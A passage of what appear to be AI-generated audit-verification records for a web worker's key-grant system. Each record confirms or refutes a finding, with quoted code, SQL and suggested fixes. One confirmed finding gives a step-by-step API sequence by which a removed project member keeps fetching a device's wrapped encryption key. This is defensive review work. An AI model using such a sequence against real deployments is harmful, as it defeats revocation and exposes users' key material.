`instance.project_id`\".\n   - v1.js:1864-1871 (reconcileProjects) issues the same UPDATE from Drive parentage on every panel load, so simply dragging the device folder into another project folder in Drive produces the same rewrite with no API call at all.\n   Neither path touches member_key. Nothing anywhere else deletes member_key rows: `grep member_key worker/src/v1.js` yields only the INSERT (2345), the two reads (2367/2369), the explicit per-grant DELETE /v1/researcher/keys (2434/2436), and this sweep (2577). Instance revoke (v1.js:~3966) writes only `instance.revoked`/`install.revoked`.\n\n3) The read path has no membership or project predicate \u2014 v1.js:2362-2372: `authResearcher` only, then `SELECT instance_id, key_version, wrapped_ki FROM member_key WHERE researcher_id=? ...`. So, exactly as the accepted audit finding said of the pre-fix code, deletion is the only control, and it now misses this class of row.\n\n4) Every step of the attack clears its gates:\n   - POST /v1/projects/A/members: A was created via /v1/researcher/projects/create (3255-3258), which writes `drive_folder_id`, so the `not_migrated` gate (2534-2540) passes; M exists and is approved.\n   - POST /v1/researcher/keys: owner-only via authMember({instance:D}) and requires an owner grant in the list \u2014 both satisfied; row written with `project_id` = D's project at grant time.\n   - POST /projects/assign with D's device folder: a device folder is created with NO appProperties (driveEnsureDeviceFolder, v1.js:1067-1069 \u2014 `{ name, mimeType, parents:[parent] }`), so `role` is '' and the `not_a_container` / `is_a_text` checks at 3303-3306 all pass. D moves; instance.project_id = B.\n   - DELETE /v1/projects/A/members {researcher_id:'M'}: subquery selects instances with project_id='A' or (NULL and owner) \u2014 D is neither. Response `{ok:true, removed:1, grants_removed:0}`, and the audit log line records \"0 grant(s)\", i.e. the owner is told removal succeeded.\n   - GET /v1/researcher/keys as M: still returns D's `wrapped_ki`.\n\nNot deliberate: the fix's own comment argues the opposite direction (\"for a REVOCATION the safe direction is to remove too much rather than too little\", 2569-2572) \u2014 this is under-removal. Not a re-report: the audit doc's line 252 describes the mirror case (grant stamped A, remove from B), which the new SQL does close; the surviving case is remove-from-A-after-the-device-moved-to-B, i.e. residue of the remediation itself, which the prompt explicitly asks about. Not blocked by the capability deferral: no capability is involved \u2014 the owner performs steps 1-4 and M uses their own authResearcher session for step 5.\n\nThe only workaround that exists is obscure and undiscoverable: DELETE /v1/projects/B/members {researcher_id:'M'} would clear the row (M is not a member of B, so `removed` is 0 but the key sweep still fires against project B), or a hand-issued DELETE /v1/researcher/keys per grant.",
  "correction": "Two corrections to the write-up, neither of which changes the verdict:\n\n(a) Step 5 overstates the consequence. The stale row is key material only \u2014 `member_key` is never consulted by authMember (no reference to it anywhere in the authorization helper), so M gains no route access: after removal, authMember denies M on project A, and M was never a member of B, so every project-scoped route answers not_found. What M gets is the wrapped Ki itself, served indefinitely by GET /v1/researcher/keys, which is precisely the harm the removal batch's own comment names (\"'removed' would mean 'no longer listed' while they still hold every wrapped Ki the ledger handed them \u2014 revocation as a UI state rather than an act (invariant I5)\"). Decryption of live device traffic requires ciphertext M can no longer fetch through the worker; the exposure is the un-withdrawable key plus anything M cached or later obtains out of band.\n\n(b) The root is broader than the removal route, and a fix confined to the DELETE would be incomplete. Nothing sweeps `member_key` when an instance changes project at all \u2014 v1.js:3315-3319 (/projects/assign) and v1.js:1864-1871 (reconcileProjects' Drive-parentage correction) both rewrite `instance.project_id` while leaving every grant in place. So the leak begins at the MOVE, not at the removal: the moment D is moved to B, M \u2014 still a member of A and of nothing else that contains D \u2014 is holding and can still fetch a key for a device outside their project (\"a member reaches everything in their project, nothing outside it\"). The removal blind spot is the second-order effect. The durable fix is to sweep grants at the point the device leaves a project (delete member_key for that instance and every project_member of the OLD project, in the same batch as the project_id update, in both writers), which also makes the removal sweep's reliance on the current instance.project_id sound.\n\nSuggested title: \"Nothing revokes key grants when a device changes project \u2014 the move leaves the old project's members holding a fetchable Ki, and removal from that project cannot reach it (v1.js:2577 with v1.js:3316 / v1.js:1869)\"."
}
```

## a1ec7dbf0303e8c4d

```json
{
  "reasoning": "CONFIRMED \u2014 every quoted line matches the current code and the sequence reproduces.\n\nMechanics verified:\n1. v1.js:2576-2579 resolves the grants to delete via `SELECT instance_id FROM instance WHERE project_id=? OR (project_id IS NULL AND researcher_id=?)` bound (who, projectId, owner). With instance D now carrying project_id=B and the removal issued against project A, clause 1 is 'B'='A' (false) and clause 2 requires project_id IS NULL (false). The (D, M) member_key row survives.\n2. The column the subquery trusts is mutable by ordinary owner action. v1.js:3312-3317 (`const newPid = destRow ? destRow.project_id : null;` then `UPDATE instance SET project_id=? WHERE oauth_folder_id=? AND researcher_id=?`), and the route's own comment says the update is REQUIRED because \"Phase C authorizes from `instance.project_id`\". Stronger than the claim states: v1.js:1857-1870 (reconcileProjects) re-stamps instance.project_id from Drive parentage on EVERY panel load (`if (pid && x.project_id !== pid) UPDATE ... SET project_id=?`), so the move needs no API call at all \u2014 dragging the device folder into another project folder in Drive and reopening the panel is enough.\n3. Nothing else removes the row. `grep -n member_key worker/src/v1.js` yields exactly two DELETE sites: 2434/2436 (owner-only DELETE /v1/researcher/keys, manual, per-instance) and 2577 (this one). schema-current.sql:107-116 defines member_key with PRIMARY KEY (instance_id, researcher_id, key_version) and NO foreign key or cascade. Instance revoke deletes no member_key rows. No retention/cron path exists in worker/src/.\n4. The read path has no membership predicate: v1.js:2362-2370 uses authResearcher only and selects `WHERE researcher_id=?`. M, still an approved researcher on their own account, is handed the row.\n5. The owner is told it worked: v1.js:2584 returns `{ ok: true, removed: 1, grants_removed: 0 }`.\n\nPreconditions all hold in the normal case: POST /v1/instances stamps a real project_id from a verified Drive folder (v1.js:3584-3588), so non-NULL instance.project_id is the ordinary state; /projects/create writes the D1 project row with drive_folder_id (v1.js:3256), so newPid is non-NULL for a normally created project B.\n\nRefutation attempts that failed:\n- The broad second disjunct does not rescue it \u2014 it only covers project_id IS NULL, and B is a real project.\n- authMember (v1.js:568-685) offers no alternate cleanup; it is a read-side authority only.\n- The /v1/textfile minter recheck at v1.js:1936-1941 does exactly the right join (`project_member pm JOIN instance i ON i.project_id=pm.project_id`), i.e. it asks whether the minter is a member of the project the instance is CURRENTLY in. That proves the codebase already uses current-instance-project semantics for revocation-style checks, so the member_key path is inconsistent rather than deliberately different.\n- It is not a re-report of audit finding #243. That finding's stated attack moves D from A to B and removes M from B (the row was stamped A); the landed remediation fixes exactly that direction. The mirror direction \u2014 remove M from A after D has moved to B \u2014 is left open by the new SQL, which is precisely the \"is the remediation itself sound\" question.\n\nThe DELETE's own comment claims completeness (\"The instance table is the authority for which project a device is in, so ask it\") and reasons that for a revocation the safe direction is to remove too much rather than too little; this case under-removes, against that stated intent.",
  "refuted": false,
  "correction": "Two corrections to how the finding should be filed, neither of which refutes it:\n\n1. LOCATION / ROOT. Line 2577 is arguably correct as scoped: once D is in B, D is not one of project A's instances, so a removal against A has no business touching it. The real root is that NO code path revokes a member_key grant when an instance LEAVES a project. The grant becomes illegitimate at step 3 (the move), not at step 4 (the removal) \u2014 M is a member of A only, and D is now in B, so from the moment of the move M holds a grant on a device outside every project M belongs to, with the removal step merely being where the owner is falsely told the cleanup succeeded. The durable fix belongs at POST /v1/researcher/projects/assign (v1.js:3312-3320) and at reconcileProjects' correction (v1.js:1866-1871): when an instance's project_id changes from P_old to P_new, delete member_key rows for that instance held by researchers who are members of P_old but not P_new. Fixing it by widening the DELETE at 2577 to all of the owner's instances would introduce a real bug \u2014 an owner whose member M belongs to both A and B would have M's legitimate B grants destroyed by a removal from A.\n\n2. HARM IS OVERSTATED IN STEP 5. \"can decrypt D's E2EE reports and commands\" claims more than M can newly obtain. After removal M is a member of nothing, so every authMember-gated route resolving to instance D denies (authMember, v1.js:626-685), and the /v1/textfile minter recheck at v1.js:1936-1941 already 410s a member-minted token once the minter is no longer in the instance's current project. M gets the wrapped Ki, not fresh ciphertext through the worker. The accurate statement of harm is key-bytes retention: the worker keeps handing over a wrapped instance key that revocation was supposed to stop handing over \u2014 which is exactly and only what DELETE /v1/researcher/keys exists to deny (its own comment: \"deleting the row stops the worker HANDING OVER the wrapped key\"), and what the two already-fixed revocation findings were about. Rate it on that basis, not on a claim of live decryption of new material."
}
```

## a21592eb04faaf5d8

```json
{
  "refuted": true,
  "reasoning": "The code reading is accurate, but the defect it alleges is not one.\n\nWHAT IS TRUE. `worker/src/v1.js:2549-2582` \u2014 the DELETE arm of `/v1/projects/<id>/members` really has no owner check:\n  `const who = String(body.researcher_id || '').replace(/[^\\w-]/g,'').slice(0,64);`\n  `if (!who) return j({ error: 'bad_body' }, 400, ...);`\nthen straight into the batch, whose second statement is\n  `'DELETE FROM member_key WHERE researcher_id=? AND instance_id IN (SELECT instance_id FROM instance WHERE project_id=? OR (project_id IS NULL AND researcher_id=?))'` `.bind(who, projectId, ctx.owner.researcher_id)`.\nIts siblings do guard: `v1.js:2509` `if (who === ctx.owner.researcher_id) return j({ error: 'owner_is_not_a_member' }, 400, ...)` and `v1.js:2429-2431` `if (grantee === ctx.owner.researcher_id) return j({ error: 'owner_grant_required' }, 400, ...)`. So passing the owner's own id does delete the owner's `member_key` rows for the project's instances and for their unassigned instances, and returns `{ok:true, removed:0, grants_removed:N}`.\n\nWHY IT IS NOT A DEFECT.\n\n1. No privilege boundary is crossed. The route gate is `const ctx = await authMember(request, env, { project: projectId }, null); if (!ctx) 401; if (!ctx.ok || !ctx.isOwner) return not_found` (v1.js:2492-2494). Only the owner can reach it, and the only rows it can touch with `who = owner` are the owner's own. No member, no capability, and no outside caller can trigger it \u2014 including via the deferred-caps analysis, since the route is owner-only rather than capability-gated. This is an owner deleting their own rows, not an authorization defect, and it breaches none of the stated invariants: wrap-to-owner (I: \"the owner always retains a readable copy\") is the *write-path* rule that stops a member minting a key the owner cannot read (`owner_grant_required` at v1.js:2338-2340) \u2014 it is not a promise that the owner cannot delete their own ledger row.\n\n2. The stated consequence chain is materially wrong, because the claim did not check the client's heal. `bootstrap()` fires `ensureResearcherKeys(v)` on every panel load / sign-in (docs/js/researcher.js:237), which calls `selfGrantMissing()` (researcher.js:371-405): for every LIVE instance whose Ki is in the legacy `settings_blob.wrappedKis` store but that has no `member_key` row, it re-mints the owner self-grant via `POST /v1/researcher/keys`. So the deleted rows are restored automatically, with no manual reconstruction and no user action. The claim's \"the owner must now reconstruct from the legacy map\" is precisely what the code already does unprompted.\n\n3. Nothing is inaccessible even in the interim. `getKi()` (researcher.js:443-468) resolves memory \u2192 `member_key` grant \u2192 the legacy Kr-wrapped store, and the legacy step is documented as permanent: \"\u26a0 THE LEGACY STEP IS LAST AND STAYS FOREVER \u2026 Removing it is a separate decision requiring evidence that every account has migrated\". Nothing server-side consults the owner's `member_key` row for authorization (`grep -n member_key` shows uses only in the keys write/read, the keys DELETE, and this batch; `authMember` never reads it), so no route changes behaviour.\n\n4. The legacy copy is guaranteed to exist for exactly the instances this batch can reach. Every instance in a project belongs to the project owner, and `createInstance()` (researcher.js:474-500) writes `settingsCache.wrappedKis[instance_id]` for every device it creates, aborting (and revoking the instance) if it cannot. A member cannot create an instance in the owner's project: `POST /v1/instances` uses `authResearcher` and stamps `instance.researcher_id = r.researcher_id`, and the project stamp is `SELECT project_id FROM project WHERE drive_folder_id=? AND owner_id=?` bound to the caller (v1.js:3533-3592). So there is no owner-held grant that exists only in the ledger today.\n\n5. The only unrecoverable version of this is hypothetical: it requires Phase E rotation to have made the ledger authoritative and the legacy map to have been retired. Neither exists in the code, and the code explicitly commits to the opposite. A finding whose harm is contingent on unwritten future code is not evidenced in code.\n\nWhat is left is a defensive-consistency gap: a request that should be rejected as a category error (`owner_is_not_a_member`, exactly as the POST does) instead performs a self-healing no-op and reports `ok:true` with a nonzero `grants_removed`. Worth a one-line guard for symmetry, but it is not a defect anyone can be harmed by in the current system, and reporting it as one invites a \"fix\" narrative about revocation being broken when it is not.",
  "correction": "The missing guard is real but the impact is not. Accurate statement: DELETE /v1/projects/<id>/members is owner-only (v1.js:2492-2494), so only the owner can pass their own researcher_id, and doing so deletes the owner's own member_key rows for that project's instances plus their unassigned ones while the project_member delete matches nothing. That is self-inflicted, crosses no privilege boundary, and costs no access: getKi() falls through to the permanent legacy Kr-wrapped store (researcher.js:443-468), and selfGrantMissing() re-mints every missing owner self-grant on the next bootstrap (researcher.js:237, 371-405), for instances whose legacy copy createInstance always writes (researcher.js:474-500). Suggested treatment if anyone wants it: add `if (who === ctx.owner.researcher_id) return j({ error: 'owner_is_not_a_member' }, 400, origin, env);` before the batch, as a symmetry/hygiene change \u2014 not as a revocation or authorization fix, and not as a prerequisite for anything shipping today. It becomes load-bearing only if Phase E rotation ever retires the legacy wrappedKis map, at which point the guard should land with that work."
}
```

## ae3d7d6feb93d3762

```json
{
  "refuted": true,
  "reasoning": "The code reading is accurate but the finding fails the reachability and impact bars.\n\n(a) The omission is real: worker/src/v1.js:2549-2582, the DELETE arm, has no `who === ctx.owner.researcher_id` check, and its second statement `DELETE FROM member_key WHERE researcher_id=? AND instance_id IN (SELECT instance_id FROM instance WHERE project_id=? OR (project_id IS NULL AND researcher_id=?))` has no membership predicate, so binding the owner's id does target the owner's own rows. The siblings do guard it (2509 `owner_is_not_a_member`; 2429-2431 `owner_grant_required`).\n\n(b) But the entire block is owner-only: v1.js:2500-2502 `const ctx = await authMember(request, env, { project: projectId }, null); if (!ctx) return unauthorized; if (!ctx.ok || !ctx.isOwner) return not_found;`, and authMember sets isOwner only when `project.owner_id === caller.researcher_id` (v1.js:645). So no member, no capability holder, and no outsider can fire it \u2014 only the owner, against their own id. Auth is header-borne (`x-fx-researcher` / `x-fx-secret`, v1.js:399-401), not cookie-borne, so there is no CSRF route to make the owner send it involuntarily.\n\n(c) No client path exists. grep for `/members` across docs/js/researcher-panel.js and docs/js/researcher.js returns zero hits \u2014 nothing in the repo calls /v1/projects/<id>/members. The \"panel bug or copy-pasted researcher id\" half of the attack has no code behind it; the request must be hand-crafted.\n\n(d) The consequence is nil today and self-healing, and not for the reason the finding gives. createInstance (docs/js/researcher.js:483-497) still writes every newly minted Ki into the legacy `settings_blob.wrappedKis` store under Kr and ABORTS instance creation if that write fails (\"Don't strand a keyless instance\"), so the owner holds a Kr-wrapped copy of every Ki they own, new devices included. selfGrantMissing (researcher.js:371-405, called from ensureResearcherKeys on every unlock) re-POSTs /v1/researcher/keys for exactly the instances with no member_key row (`if (have[instanceId]) continue;`). So the deletion costs one automatic re-grant per device at next sign-in \u2014 it cannot lock the owner out, and POST /v1/researcher/keys' owner_grant_required (v1.js:2337-2339) is satisfiable by the owner unaided.\n\n(e) The unrecoverable variant depends on Phase E removing the legacy store, which the code explicitly commits to keeping: researcher.js:432-437 \"THE LEGACY STEP IS LAST AND STAYS FOREVER\u2026 Removing it is a separate decision requiring evidence that every account has migrated.\" That is a hypothetical future state, not current code.\n\nNor is the wrap-to-owner invariant as enforced actually broken: it constrains stored SETS (the insert refuses a set lacking the owner's copy), and that check still holds and is re-satisfiable. Under the stated lens \u2014 reachability, an adversary, and a concrete request sequence with real consequence \u2014 this is a missing symmetry guard on a self-inflicted no-op, not a defect.",
  "correction": "The route genuinely lacks the guard its two siblings have, and adding `if (who === ctx.owner.researcher_id) return j({ error: 'owner_is_not_a_member' }, 400, origin, env);` after the `who` parse at v1.js:2551 is cheap, consistent hardening worth doing before Phase E makes the ledger authoritative. But it should be filed as hardening, not as an audit finding: the caller must be the project owner (v1.js:2500-2502 + authMember:645), no client code calls the route, auth is header-borne so it cannot be triggered cross-site, and any rows deleted are automatically re-minted by selfGrantMissing (docs/js/researcher.js:371-405) from the legacy `settings_blob.wrappedKis` copy that createInstance (researcher.js:483-497) still writes for every device."
}
```

## a85120203b9171f7a

```json
{
  "refuted": true,
  "reasoning": "The code quotes are accurate \u2014 the DELETE branch really has no owner check (worker/src/v1.js:2549-2552), and the member_key statement really is keyed on `researcher_id=?` plus the project's instances with no membership predicate (2574-2579), so passing the owner's own id would delete the owner's wrapped-Ki rows while statement 1 matches nothing. The mechanism is literally true. It fails the does-it-actually-matter test on three independent grounds.\n\n1) NO BOUNDARY IS CROSSED. The route is gated at 2497-2500: `const ctx = await authMember(request, env, { project: projectId }, null); if (!ctx) ... 401; if (!ctx.ok || !ctx.isOwner) return j({ error: 'not_found' }, 404, ...)`. Only the authenticated owner reaches the DELETE, and the only rows the request can destroy are that same owner's own key copies for that owner's own devices. No member (with any cap), no other researcher, and no unauthenticated caller can perform it. It is a self-inflicted request, not a privilege defect, and none of the eight stated design rules about authority, fail-closed, not_found, or project scoping is violated.\n\n2) THE DAMAGE SELF-HEALS WITHOUT USER ACTION \u2014 the \"unrecoverable after Phase E\" framing is about code that does not exist, and even the current low-severity framing is overstated. The owner's Ki is not stored only in member_key. `createInstance` (docs/js/researcher.js:474-486) writes every newly minted Ki into `settings_blob.wrappedKis` for EVERY device the owner creates, and the module states the guarantee explicitly at researcher.js:322-323: *\"the LEGACY PATH KEEPS WORKING INDEFINITELY. Nothing below ever deletes `wrappedKis`.\"* More decisively, `selfGrantMissing` (researcher.js:373-405) runs on every `bootstrap()` via `ensureResearcherKeys(v)` and re-writes exactly the rows this attack deletes: `const have = await loadGrants(); ... for (const instanceId of ids) { if (have[instanceId]) continue; ... await api('POST', '/v1/researcher/keys', { body: { instance_id: instanceId, grants: [{ researcher_id: me, wrapped_ki }] } ...`. After the described request, the owner's next sign-in sees `have[instanceId]` absent and re-mints the grant from the legacy store \u2014 satisfying the wrap-to-owner check at v1.js:2338-2339 by construction (\"Self-granting satisfies that by construction \u2014 I am the owner of everything in my own legacy store\"). So GET /v1/researcher/keys being briefly empty is a transient state that repairs itself, and getKi (researcher.js:437-470) never fails in the interim because the legacy branch resolves it.\n\n3) THE SIBLING GUARDS PROTECT A DIFFERENT, ACTUALLY-REACHABLE SLIP. DELETE /v1/researcher/keys (2429-2431) takes an arbitrary `researcher_id` for a per-device revoke list where the owner's own grant IS one of the visible rows in the ledger \u2014 that is a plausible mis-click, hence the guard. The members DELETE takes an id from the membership list, which by construction can never contain the owner: POST refuses it (2509 `owner_is_not_a_member`), and GET reads `project_member` (2503-2504), where the owner is never a row. There is additionally no client caller at all \u2014 `grep -rn \"members\" docs/js/researcher-panel.js docs/js/researcher.js` returns nothing, so the panel bug the claim posits as the trigger has no code to originate in. Reproduction requires the owner to hand-craft a request substituting their own id for a member's.\n\nI also checked the two things that could have made this worse and neither does: `instance.project_id` exists (worker/migrate-projects.sql:64), so the subselect runs rather than throwing, and the over-broad `(project_id IS NULL AND researcher_id=?)` clause is documented as a deliberate revocation-safety choice (2568-2573), not an oversight.",
  "correction": "Not a defect as filed. What is real is a small consistency gap worth a one-line hardening, not an audit finding: DELETE /v1/projects/<id>/members could mirror its POST sibling with `if (who === ctx.owner.researcher_id) return j({ error: 'owner_is_not_a_member' }, 400, origin, env);` before the batch. That would make the owner-is-never-a-member rule symmetric on both write paths and would matter if Phase E rotation ever makes member_key authoritative and retires the `settings_blob.wrappedKis` fallback \u2014 at which point the guard becomes load-bearing rather than cosmetic. Today it prevents nothing an owner cannot already do to themselves and immediately undo by signing in again."
}
```
